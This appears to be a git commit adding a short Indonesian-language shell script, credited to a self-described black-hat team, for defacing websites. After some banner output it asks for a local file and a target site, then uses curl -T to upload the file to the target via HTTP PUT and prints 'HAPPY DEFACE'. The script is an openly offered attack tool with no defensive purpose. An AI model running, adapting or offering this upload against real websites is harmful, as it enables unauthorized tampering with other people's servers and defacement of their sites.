cd360a788dc520b7fb3039837c43e170a5f9752f
R133FGANZ <50979010+SCTcyber@users.noreply.github.com>
2019-08-22 16:09:23 +0700

    Add files via upload

---
+++ DafaceR133F.sh
@@ -0,0 +1,23 @@
+clear
+
+toilet -f slant --gay "Dafacer"
+sleep 3
+echo "\033[32;1mauthor: Mr.4R13F"
+echo "\033[33;1mTeam: Devlin Cyber Team"
+echo "\033[34;1mIndonesia Dafacer Team"
+echo "\033[32;1mJawaTimur Black hat"
+echo "Masukan nama script"
+read -p "[=======>" script
+echo "\033[32;1m"
+echo "Masukan Web Target Ke1"
+read -p "[=======>" Ke1
+curl -T /storage/emulated/0/$script $Ke1
+sleep 4
+echo 'wait...'
+sleep 5
+echo "[<=====================SEDANG PROSES=====================>]"
+sleep 4
+echo "Silahkan Cek Web $Ke1/$script"
+sleep 1
+
+echo "[=============HAPPY DEFACE=============]"
